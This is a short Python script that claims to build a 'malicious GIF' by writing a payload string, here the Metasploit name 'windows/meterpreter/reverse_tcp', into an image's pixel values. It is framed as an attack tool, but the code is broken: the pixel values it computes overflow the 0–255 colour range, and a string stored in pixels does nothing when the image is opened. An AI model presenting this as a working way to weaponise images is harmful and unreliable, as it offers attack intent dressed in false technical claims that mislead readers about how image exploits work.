import logging
from PIL import Image

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s')

# Define the malicious GIF creation function
def create_malicious_gif(payload, output_path='malicious.gif'):
    try:
        # Create a new GIF image
        img = Image.new('RGB', (100, 100))
        img.putdata([(0, 0, 0)] * 10000)

        # Embed the malicious payload in the GIF image
        payload_bytes = payload.encode('utf-8')
        for i, byte in enumerate(payload_bytes):
            pixel_value = (byte << 8) | (i % 256)
            img.putpixel((i % 100, i // 100), (pixel_value, pixel_value, pixel_value))

        # Save the GIF image
        img.save(output_path)
        logging.info(f"Successfully created malicious GIF: {output_path}")
    except Exception as e:
        logging.error(f"Error creating malicious GIF: {e}")

# Example usage:
if __name__ == '__main__':
    payload = 'windows/meterpreter/reverse_tcp'
    create_malicious_gif(payload)
